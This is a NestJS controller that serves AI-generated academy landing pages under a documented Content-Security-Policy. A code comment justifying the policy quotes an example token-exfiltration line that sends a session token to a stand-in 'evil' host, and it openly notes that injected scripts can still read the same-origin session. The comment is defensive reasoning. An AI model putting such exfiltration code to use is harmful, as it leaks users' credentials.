import { Controller, Get, Header, Param, Query, Req, Res } from '@nestjs/common';
import { ApiOperation, ApiTags } from '@nestjs/swagger';
import { Request, Response } from 'express';
import { Public } from '../../common/decorators/public.decorator';
import { PublicSiteService } from './public-site.service';
import { withSignedInCta } from './signed-in-cta';

function clampLimit(raw: unknown, def = 6): number {
  const n = parseInt(String(raw ?? ''), 10);
  if (!Number.isFinite(n)) return def;
  return Math.min(24, Math.max(1, n));
}

/**
 * The one policy that applies to AI-generated academy pages.
 *
 * `main.ts` turns helmet's CSP off globally, because the same process serves
 * the SPA and an over-strict default would break it. That left generated HTML
 * — the one thing on this origin assembled from teacher-supplied text — with
 * no policy at all, on the same origin as the app whose tokens live in
 * `localStorage`.
 *
 * ── What this does and does not fix ───────────────────────────────────────
 *
 * It does **not** stop a generated page reading the session. It cannot: the
 * page is deliberately same-origin and `signed-in-cta.ts` relies on exactly
 * that to turn "sign up" into "see their courses" for a student who already
 * has an account. That coupling is a product decision, and undoing it is a
 * bigger change than a header.
 *
 * What it does is close the ways a token would leave the browser.
 * `connect-src 'self'` blocks fetch, XHR, WebSocket and sendBeacon to anywhere
 * but this origin, and `img-src` without a wildcard blocks the oldest trick of
 * all — `new Image().src = 'https://evil/?t=' + token`. An injected script can
 * still run; it can no longer phone home.
 *
 * `'unsafe-inline'` is present for scripts and styles and is not an oversight:
 * the compiled page is inline by construction, and the signed-in CTA is
 * injected as an inline `<script>` at serve time. Removing it means nonces
 * through the whole renderer, which is a change to how pages are built rather
 * than how they are served.
 *
 * Every source here is one the template actually uses: Google Fonts for the
 * stylesheet and the font files, `data:`/`blob:` for inlined avatars and
 * thumbnails, and `'self'` for the courses fetch and for media the API streams
 * from private storage.
 */
const GENERATED_SITE_CSP = [
  "default-src 'none'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com data:",
  "img-src 'self' data: blob:",
  "connect-src 'self'",
  "form-action 'self'",
  "frame-ancestors 'self'",
  "base-uri 'none'",
  "object-src 'none'",
].join('; ');

@ApiTags('academy-studio/public')
@Public()
@Controller()
export class PublicSiteController {
  constructor(private readonly site: PublicSiteService) {}

  @Get('a/:slug')
  @ApiOperation({ summary: 'Public: the published academy landing page (HTML)' })
  async page(@Param('slug') slug: string, @Req() req: Request, @Res() res: Response) {
    const published = await this.site.getPublished(slug);
    if (!published) {
      res.status(404).type('html').send('<!doctype html><meta charset="utf-8"><title>404</title><h1>Page not found</h1>');
      return;
    }
    const etag = `W/"site-${published.academyId}-v${published.version}"`;
    if (req.headers['if-none-match'] === etag) {
      res.status(304).end();
      return;
    }
    res.setHeader('ETag', etag);
    res.setHeader('Cache-Control', 'public, max-age=60, stale-while-revalidate=600');
    res.setHeader('Content-Security-Policy', GENERATED_SITE_CSP);
    // Belt and braces with img-src/connect-src below: a generated page has no
    // business framing anything or being framed by anyone but this app.
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    // A student who is already signed in gets a way into the app instead of a
    // sign-up form for an account they have. See signed-in-cta.ts for why this
    // is applied here and not in the template.
    res.type('html').send(withSignedInCta(published.html));
  }

  @Get('a/:slug/site-status')
  @Header('Cache-Control', 'no-store')
  @ApiOperation({ summary: 'Public: whether the academy has a live AI site' })
  async siteStatus(@Param('slug') slug: string) {
    return { published: await this.site.isPublished(slug) };
  }

  /**
   * These two exist so a cached page never shows a stale list — the HTML is baked
   * at publish time and fills these in at view time. That only works if the
   * responses themselves are not cached, and they carried no Cache-Control at
   * all, so browsers were free to reuse them by heuristic. A teacher publishing a
   * course would look at their own site and not find it, with nothing to do but
   * wait for a cache they cannot see to expire.
   */
  @Get('a/:slug/courses')
  @Header('Cache-Control', 'no-store')
  @ApiOperation({ summary: 'Public: published courses for the academy (hydration)' })
  courses(@Param('slug') slug: string, @Query('limit') limit?: string) {
    return this.site.courses(slug, clampLimit(limit));
  }

  @Get('a/:slug/reviews')
  @Header('Cache-Control', 'no-store')
  @ApiOperation({ summary: 'Public: recent reviews for the academy (hydration)' })
  reviews(@Param('slug') slug: string, @Query('limit') limit?: string) {
    return this.site.reviews(slug, clampLimit(limit));
  }

  @Get('sitemap.xml')
  @ApiOperation({ summary: 'Public: sitemap of published academy pages' })
  async sitemap(@Res() res: Response) {
    const base = (process.env.API_URL ?? '').replace(/\/$/, '');
    const rows = await this.site.publishedSlugs();
    const urls = rows
      .map(
        (r) =>
          `<url><loc>${base}/api/v1/a/${encodeURIComponent(r.slug)}</loc><lastmod>${r.updatedAt.toISOString()}</lastmod></url>`,
      )
      .join('');
    res
      .type('application/xml')
      .send(`<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">${urls}</urlset>`);
  }

  @Get('robots.txt')
  @ApiOperation({ summary: 'Public: robots.txt' })
  robots(@Res() res: Response) {
    const base = (process.env.API_URL ?? '').replace(/\/$/, '');
    res.type('text/plain').send(`User-agent: *\nAllow: /\nSitemap: ${base}/api/v1/sitemap.xml\n`);
  }
}
